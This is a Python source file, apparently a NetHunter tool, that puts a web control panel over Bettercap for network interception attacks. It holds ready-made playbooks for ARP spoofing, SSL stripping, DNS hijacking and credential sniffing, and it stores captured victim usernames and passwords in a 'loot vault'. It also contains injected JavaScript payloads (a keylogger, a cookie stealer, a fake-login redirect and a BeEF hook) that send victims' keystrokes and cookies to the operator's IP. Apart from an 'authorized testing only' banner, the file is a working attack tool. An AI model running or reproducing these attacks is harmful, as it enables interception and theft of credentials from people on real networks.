#!/usr/bin/env python3
"""
🔥 Bettercap Commander v2.0 - NetHunter Ultimate Edition
سيناريوهات هجوم + أوامر Set الذكية + خزنة كلمات المرور
⚠️ للاختبار المصرح به فقط
"""
import os, sys, json, subprocess, socket, re, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime

os.environ['NO_PROXY'] = '127.0.0.1,localhost'
os.environ['no_proxy'] = '127.0.0.1,localhost'

BCAP_HOST = "127.0.0.1"
BCAP_PORT = 8025
BCAP_USER = "admin"
BCAP_PASS = "admin"
WEB_PORT  = 8989

bettercap_proc = None
iface = None
my_ip = None
gw_ip = None
loot_vault = []  # captured credentials

def banner():
    print("""
╔══════════════════════════════════════════════════╗
║  🔥 Bettercap Commander v2.0 - NetHunter       ║
║  سيناريوهات + أوامر ذكية + خزنة صيد            ║
║  ⚠️  للاختبار المصرح به فقط                     ║
╚══════════════════════════════════════════════════╝""")

def sh(cmd):
    try: return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout.strip()
    except: return ""

def bcap_api(endpoint, method="GET", data=None):
    try:
        url = f"http://{BCAP_HOST}:{BCAP_PORT}{endpoint}"
        cmd = ["curl","-s","-u",f"{BCAP_USER}:{BCAP_PASS}","-X",method]
        if method == "POST" and data:
            cmd += ["-H","Content-Type: application/json","-d",data]
        cmd.append(url)
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
                           env={**os.environ, 'NO_PROXY':'127.0.0.1,localhost'})
        if not r.stdout.strip(): return {"ok":False,"error":"Empty"}
        try: return {"ok":True,"data":json.loads(r.stdout)}
        except: return {"ok":True,"data":r.stdout}
    except Exception as e:
        return {"ok":False,"error":str(e)}

def bcap_cmd(command):
    return bcap_api("/api/session","POST",json.dumps({"cmd":command}))

def get_ifaces():
    out = sh("ip -o link show | awk -F': ' '{print $2}'")
    result = []
    for name in out.split('\n'):
        name = name.strip().split('@')[0]
        if not name or name == 'lo': continue
        ip = sh(f"ip -4 -o addr show {name} 2>/dev/null | awk '{{print $4}}' | cut -d/ -f1")
        icon = "📶" if "wlan" in name else "🔌" if any(x in name for x in ["eth","usb"]) else "📱" if "rmnet" in name else "🌐"
        result.append({"name":name,"ip":ip or "غير متصل","icon":icon})
    return result

def get_gateway():
    try:
        with open('/proc/net/route') as f:
            for line in f.readlines()[1:]:
                p = line.strip().split()
                if len(p) >= 3 and p[1] == '00000000' and p[2] != '00000000':
                    b = bytes.fromhex(p[2])
                    return f"{b[3]}.{b[2]}.{b[1]}.{b[0]}"
    except: pass
    return None

def start_bettercap(interface):
    global bettercap_proc
    print(f"\n[*] تشغيل Bettercap على {interface}...")
    cmd = ["bettercap","-iface",interface,"-eval",
        f"set api.rest.username {BCAP_USER}; set api.rest.password {BCAP_PASS}; "
        f"set api.rest.address 0.0.0.0; set api.rest.port {BCAP_PORT}; api.rest on"]
    log = open("bettercap.log","w")
    try:
        bettercap_proc = subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT)
        import time
        for i in range(15):
            time.sleep(1)
            r = bcap_api("/api/session")
            if r.get("ok"):
                print("  ✅ Bettercap متصل!")
                return True
            print(f"  ⏳ ({i+1}/15)...")
        print("  ❌ فشل الاتصال!")
        with open("bettercap.log") as f:
            for l in f.readlines()[-20:]: print(f"   {l.rstrip()}")
        return False
    except Exception as e:
        print(f"  ❌ {e}")
        return False

# =========== WEB HANDLER ===========
class Handler(BaseHTTPRequestHandler):
    def log_message(self,*a): pass

    def _json(self, data, code=200):
        self.send_response(code)
        self.send_header('Content-Type','application/json; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        for h in ['Access-Control-Allow-Origin','Access-Control-Allow-Methods','Access-Control-Allow-Headers']:
            self.send_header(h, '*' if 'Origin' in h else 'GET,POST,OPTIONS' if 'Methods' in h else 'Content-Type')
        self.end_headers()

    def _body(self):
        cl = int(self.headers.get('Content-Length',0))
        return json.loads(self.rfile.read(cl).decode()) if cl else {}

    def do_GET(self):
        p = urlparse(self.path).path
        if p in ('/','/index.html'): self._serve_html()
        elif p == '/api/health': self._json({"status":"ok"})
        elif p == '/api/status': self._status()
        elif p == '/api/endpoints': self._endpoints()
        elif p == '/api/events': self._events()
        elif p == '/api/loot': self._json({"success":True,"data":{"loot":loot_vault}})
        else: self._json({"error":"not found"},404)

    def do_POST(self):
        p = urlparse(self.path).path
        d = self._body()
        if p == '/api/toggle': self._toggle(d)
        elif p == '/api/probe': self._probe()
        elif p == '/api/stopall': self._stopall()
        elif p == '/api/mitm_start': self._mitm(d)
        elif p == '/api/sslstrip_on': self._sslstrip()
        elif p == '/api/raw': self._raw(d)
        elif p == '/api/clear': bcap_cmd("events.clear"); self._json({"success":True})
        elif p == '/api/playbook': self._playbook(d)
        elif p == '/api/smart/dns': self._smart_dns(d)
        elif p == '/api/smart/inject': self._smart_inject(d)
        elif p == '/api/smart/sniff': self._smart_sniff(d)
        elif p == '/api/smart/target': self._smart_target(d)
        else: self._json({"error":"not found"},404)

    def _status(self):
        r = bcap_api("/api/session")
        if not r.get("ok"):
            self._json({"alive":False,"error":r.get("error",""),"my_ip":my_ip,"gateway":gw_ip,
                        "modules":{},"endpoints_count":0,"events_count":0,"uptime":0})
            return
        s = r["data"]
        mods = {}
        ml = s.get("modules",[])
        if isinstance(ml,list):
            for m in ml: mods[m.get("name","")] = m.get("running",False)
        elif isinstance(ml,dict):
            for k,v in ml.items(): mods[k] = v.get("running",False)
        ec = 0
        er = bcap_api("/api/events")
        if er.get("ok"): ec = len(er["data"].get("events",[]))
        self._json({"alive":True,
            "my_ip": s.get("interface",{}).get("ipv4",my_ip),
            "my_mac": s.get("interface",{}).get("mac"),
            "interface_name": s.get("interface",{}).get("name",iface),
            "gateway": s.get("gateway",{}).get("ipv4",gw_ip),
            "gateway_mac": s.get("gateway",{}).get("mac"),
            "modules": mods, "endpoints_count": len(s.get("lan",{}).get("hosts",[])),
            "events_count": ec, "uptime": 0})

    def _endpoints(self):
        r = bcap_api("/api/session")
        if not r.get("ok"): self._json({"endpoints":[]}); return
        hosts = r["data"].get("lan",{}).get("hosts",[])
        eps = [{"ip":h.get("ipv4",""),"mac":h.get("mac",""),"hostname":h.get("hostname",""),
                "vendor":h.get("vendor",""),"sent":h.get("meta",{}).get("sent",0) if isinstance(h.get("meta"),dict) else 0,
                "recv":h.get("meta",{}).get("recv",0) if isinstance(h.get("meta"),dict) else 0} for h in hosts]
        self._json({"endpoints":eps})

    def _events(self):
        r = bcap_api("/api/events")
        if not r.get("ok"): self._json({"events":[]}); return
        evts = []
        for e in r["data"].get("events",[])[:100]:
            tag = e.get("tag","")
            t = "cred" if any(x in tag for x in ["cred","password"]) else "http" if "http" in tag else "dns" if "dns" in tag else "host" if any(x in tag for x in ["endpoint","host"]) else "info"
            evts.append({"type":t,"tag":tag,"time":e.get("time",""),"data":e.get("data",{})})
            if t == "cred":
                d = e.get("data",{})
                loot_vault.append({"victimIp":d.get("from",""),"website":d.get("to",""),
                    "username":d.get("username",""),"password":d.get("password",""),
                    "protocol":d.get("protocol","HTTP"),"time":e.get("time","")})
        self._json({"events":evts})

    def _toggle(self, d):
        m, s = d.get("module",""), d.get("state",False)
        bcap_cmd(f"{m} {'on' if s else 'off'}")
        self._json({"success":True,"module":m,"state":s})

    def _probe(self):
        bcap_cmd("net.recon on"); bcap_cmd("net.probe on")
        self._json({"success":True})

    def _stopall(self):
        for m in ["arp.spoof","net.sniff","http.proxy","https.proxy","dns.spoof","dhcp6.spoof",
                   "wifi.recon","wifi.deauth","ble.recon","syn.scan","tcp.proxy","net.probe","net.recon","ticker"]:
            bcap_cmd(f"{m} off")
        self._json({"success":True})

    def _mitm(self, d):
        t = d.get("targets",[])
        if t: bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
        bcap_cmd("set arp.spoof.fullduplex true"); bcap_cmd("set arp.spoof.internal true")
        bcap_cmd("net.recon on"); bcap_cmd("arp.spoof on"); bcap_cmd("net.sniff on")
        self._json({"success":True})

    def _sslstrip(self):
        bcap_cmd("set http.proxy.sslstrip true"); bcap_cmd("http.proxy on")
        self._json({"success":True})

    def _raw(self, d):
        c = d.get("command","")
        r = bcap_cmd(c)
        out = ""
        if r.get("ok"):
            out = r["data"] if isinstance(r["data"],str) else r["data"].get("output",json.dumps(r["data"])) if isinstance(r["data"],dict) else str(r["data"])
        else: out = r.get("error","Error")
        self._json({"success":True,"command":c,"output":str(out)})

    # ===== PLAYBOOKS =====
    def _playbook(self, d):
        pb = d.get("playbook","")
        t = d.get("targets",[])
        if pb == "credential_harvest":
            if t: bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
            for c in ["set arp.spoof.fullduplex true","set arp.spoof.internal true",
                       "set net.sniff.verbose true","set net.sniff.regexp (?i)(user|pass|login|email|token|session|cookie|auth)",
                       "set http.proxy.sslstrip true","net.recon on","arp.spoof on","net.sniff on","http.proxy on"]:
                bcap_cmd(c)
        elif pb == "full_mitm":
            if t: bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
            for c in ["set arp.spoof.fullduplex true","set http.proxy.sslstrip true","set net.sniff.verbose true",
                       "net.recon on","net.probe on","arp.spoof on","net.sniff on","http.proxy on"]:
                bcap_cmd(c)
        elif pb == "stealth":
            for c in ["mac.changer on","set net.sniff.local false","set net.sniff.verbose false","net.recon on"]:
                bcap_cmd(c)
        elif pb == "dns_hijack":
            dom = d.get("domain","*"); rip = d.get("redirectIp","127.0.0.1")
            if t: bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
            for c in ["set arp.spoof.fullduplex true",f"set dns.spoof.domains {dom}",
                       f"set dns.spoof.address {rip}","set dns.spoof.all true",
                       "net.recon on","arp.spoof on","dns.spoof on"]:
                bcap_cmd(c)
        elif pb == "full_interception":
            if t: bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
            for c in ["set arp.spoof.fullduplex true","set arp.spoof.internal true",
                       "set http.proxy.sslstrip true","set net.sniff.verbose true",
                       "set dns.spoof.all true","net.recon on","net.probe on",
                       "arp.spoof on","net.sniff on","http.proxy on","dns.spoof on"]:
                bcap_cmd(c)
        self._json({"success":True,"message":f"Playbook {pb} activated"})

    # ===== SMART COMMANDS =====
    def _smart_dns(self, d):
        rules = d.get("rules",[])
        domains = ",".join(r["domain"] for r in rules if r.get("domain"))
        ip = rules[0]["ip"] if rules else "127.0.0.1"
        bcap_cmd(f"set dns.spoof.domains {domains}")
        bcap_cmd(f"set dns.spoof.address {ip}")
        bcap_cmd("set dns.spoof.all true"); bcap_cmd("dns.spoof on")
        self._json({"success":True,"message":f"DNS spoofing {len(rules)} domains"})

    def _smart_inject(self, d):
        payloads = {
            "keylogger": "<script>document.addEventListener('keypress',function(e){new Image().src='http://ATTACKER_IP:8080/k?'+e.key});</script>",
            "cookie_stealer": "<script>new Image().src='http://ATTACKER_IP:8080/c?'+document.cookie;</script>",
            "fake_login": "<script>alert('Session expired');window.location='http://ATTACKER_IP:8080/phish';</script>",
            "redirect": "<script>window.location='http://ATTACKER_IP:8080/evil';</script>",
            "beef_hook": '<script src="http://ATTACKER_IP:3000/hook.js"></script>',
            "screenshot": "<script>setTimeout(function(){},3000);</script>",
        }
        pl = d.get("payload","")
        code = d.get("customUrl") or payloads.get(pl, pl)
        if my_ip: code = code.replace("ATTACKER_IP", my_ip)
        bcap_cmd(f"set http.proxy.injectjs {code}"); bcap_cmd("http.proxy on")
        self._json({"success":True,"message":f"JS injection: {pl}"})

    def _smart_sniff(self, d):
        if d.get("ignoreLocal"): bcap_cmd("set net.sniff.local false")
        else: bcap_cmd("set net.sniff.local true")
        bcap_cmd("set net.sniff.verbose true")
        if d.get("credentialsOnly"):
            bcap_cmd("set net.sniff.regexp (?i)(user|pass|login|email|token|auth|cookie|session)")
        if d.get("httpOnly"): bcap_cmd("set net.sniff.filter tcp port 80 or tcp port 8080")
        elif d.get("dnsOnly"): bcap_cmd("set net.sniff.filter udp port 53")
        elif d.get("targetIp"): bcap_cmd(f"set net.sniff.filter host {d['targetIp']}")
        elif d.get("customFilter"): bcap_cmd(f"set net.sniff.filter {d['customFilter']}")
        bcap_cmd("net.sniff on")
        self._json({"success":True,"message":"Sniffer configured"})

    def _smart_target(self, d):
        t = d.get("targets",[])
        fd = d.get("fullDuplex", True)
        bcap_cmd(f"set arp.spoof.targets {','.join(t)}")
        bcap_cmd(f"set arp.spoof.fullduplex {'true' if fd else 'false'}")
        bcap_cmd("set arp.spoof.internal true")
        self._json({"success":True,"message":f"Targets: {','.join(t)}"})

    # ===== SERVE HTML =====
    def _serve_html(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.end_headers()
        # Read from external file or embedded
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "index.html")
        if os.path.exists(html_path):
            with open(html_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.wfile.write(b"<h1>index.html not found</h1>")


def select_iface():
    global iface, my_ip, gw_ip
    print("\n🔍 اكتشاف الشبكة...")
    ifs = get_ifaces()
    if not ifs: print("❌ لا توجد واجهات!"); sys.exit(1)
    print("\nالواجهات:")
    for i,f in enumerate(ifs,1): print(f"  [{i}] {f['icon']} {f['name']:<15} IP: {f['ip']}")
    while True:
        try:
            c = int(input("\nاختر رقم الواجهة: ").strip()) - 1
            if 0 <= c < len(ifs): iface = ifs[c]['name']; my_ip = ifs[c]['ip'] if ifs[c]['ip'] != "غير متصل" else None; break
        except: pass
        print("❌ رقم غير صحيح")
    gw_ip = get_gateway()
    print(f"\n  الواجهة: {iface}\n  عنواني:  {my_ip or 'غير متصل'}\n  الراوتر: {gw_ip or 'غير معروف'}")
    if input("\nصحيح؟ [y/n]: ").strip().lower() != 'y': sys.exit(0)

def main():
    banner()
    if os.geteuid() != 0: print("⚠️ تحتاج root!\n  sudo python3 main.py"); sys.exit(1)
    select_iface()
    port = input(f"\nمنفذ [{WEB_PORT}]: ").strip()
    port = int(port) if port else WEB_PORT
    if not start_bettercap(iface): print("\n❌ فشل!"); sys.exit(1)
    print(f"""
╔══════════════════════════════════════════════════╗
║  🌐 افتح المتصفح:                               ║
║  http://127.0.0.1:{port:<5}                          ║
║  http://{(my_ip or '0.0.0.0'):<15}:{port:<5}               ║
╚══════════════════════════════════════════════════╝""")
    try:
        srv = HTTPServer(('0.0.0.0', port), Handler)
        print(f"[*] الخادم يعمل | Ctrl+C للإيقاف\n")
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] إيقاف...")
        if bettercap_proc: bettercap_proc.terminate()
        print("[*] تم!")

if __name__ == "__main__": main()
